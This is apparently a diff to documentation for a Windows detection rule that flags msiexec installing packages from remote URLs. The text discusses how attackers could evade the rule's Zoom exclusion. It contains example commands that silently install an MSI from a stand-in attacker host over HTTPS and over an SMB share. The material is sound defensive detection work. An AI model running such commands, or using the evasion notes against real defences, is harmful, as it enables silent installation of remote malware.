@@ -91,13 +91,13 @@ process where host.os.type == "windows" and event.type == "start" and
   not process.args : ("https://zoom.us/client/*")
 ```
 
-This way, there must be an argument starting with "https://zoom.us/client/\*". An attacker can provide an arbitrary argument only once which is when they call the remote installer. All other arguments either start with a '-' or a '/'. A second arbitrary argument causes msiexec to give an error.
+This way, there must be an argument starting with "https://zoom.us/client/\*". An attacker can provide an arbitrary argument only once which is when they call the remote installer. All other arguments either start with a '-' or a '/'. A second arbitrary argument causes msiexec to give an error. So, the following msiexec command gives an error.
 
 ```powershell
 msiexec -i https://ev.il/install.msi /qn /quiet "https://zoom.us/client/"  # error
 ```
 
-Another change is I added "\\\\" to process.command_line because msiexec supports executing installers from remote SMB shares.
+Another change is I added "\\\\" to process.command_line because msiexec supports executing installers from remote SMB shares. But it does not support FTP or Gopher so we're good. So, the following msiexec command would work and would not get detected in the initial version but now it will.
 
 ```powershell
 msiexec -i \\ev.il\install.msi /qn /quiet  # valid, installs program from remote share and bypasses the first variant of the detection rule
